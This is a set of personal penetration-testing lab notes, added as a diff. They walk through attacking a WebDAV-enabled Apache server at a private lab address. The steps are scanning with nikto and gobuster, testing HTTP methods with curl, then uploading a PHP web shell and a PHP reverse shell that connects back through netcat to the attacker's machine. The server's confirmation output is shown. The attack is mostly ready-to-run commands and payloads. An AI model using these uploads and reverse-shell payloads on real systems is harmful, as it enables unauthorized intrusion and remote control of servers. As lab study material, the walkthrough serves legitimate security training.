@@ -1,0 +1,115 @@
+step 1 : nikto 
+
+
+What Is Nikto?
+Nikto
+Nikto is:
+A basic web server scanner
+Looks for misconfigurations
+Finds exposed files
+Detects outdated versions
+Checks dangerous HTTP methods
+
+ex : nikto -h http://10.0.2.4 
+
+
+"""
+Can I find credentials?
+Can I upload a file?
+Can I execute code?
+"""
+
+
+Directory Discovery
+
+> gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirb/common.txt 
+
+
+
+
+attck chain 
+------------
+
+Attack chain:
+
+Discovered /dav/
+ex : 
+
+/.hta                 (Status: 403) [Size: 285]
+/.htpasswd            (Status: 403) [Size: 290]
+/cgi-bin/             (Status: 403) [Size: 289]
+/.htaccess            (Status: 403) [Size: 290]
+/dav                  (Status: 301) [Size: 307] [--> http://10.0.2.4/dav/]
+/index.php            (Status: 200) [Size: 891]
+/index                (Status: 200) [Size: 891]
+/phpMyAdmin           (Status: 301) [Size: 314] [--> http://10.0.2.4/phpMyAdmin/]
+
+
+Checked allowed methods
+
+> curl -X OPTIONS http://10.0.2.4/dav/ -i
+
+
+Tested PUT manually
+
+>  curl -X PUT http://10.0.2.4/dav/test.txt --data "hello"
+
+
+Uploaded PHP file
+
+>  curl -X PUT http://10.0.2.4/dav/shell.php --data "<?php system('id'); ?>"
+
+
+
+
+
+
+next > Interactive reverse shell
+
+Step 1: Prepare Listener (Attacker Machine)
+
+On Kali:
+
+nc -lvnp 4444
+Step 2: Upload Reverse Shell
+
+Create a PHP reverse shell payload and upload it:
+
+ > curl -X PUT http://10.0.2.4/dav/rev_nc.php \
+--data "<?php system('/bin/nc 10.0.2.5 4444 -e /bin/bash'); ?>"
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>201 Created</title>
+</head><body>
+<h1>Created</h1>
+<p>Resource /dav/rev_nc.php has been created.</p>
+<hr />
+<address>Apache/2.2.8 (Ubuntu) DAV/2 Server at 10.0.2.4 Port 80</address>
+</body></html>
+                                  
+
+Replace YOUR_IP with your Kali IP.
+
+Step 3: Trigger It
+
+Open:
+
+> http://10.0.2.4/dav/rev_nc.php
+
+If successful:
+Your netcat listener will receive a shell.
+
+
+What Is /dav? > /dav is usually a directory configured to use WebDAV.
+
+WebDAV stands for:
+Web Distributed Authoring and Versioning
+
+It is an extension of HTTP that allows users to:
+
+Upload files
+Modify files
+Delete files
+Lock files
+Manage remote content
+Basically: It turns a web server into something like a remote file server
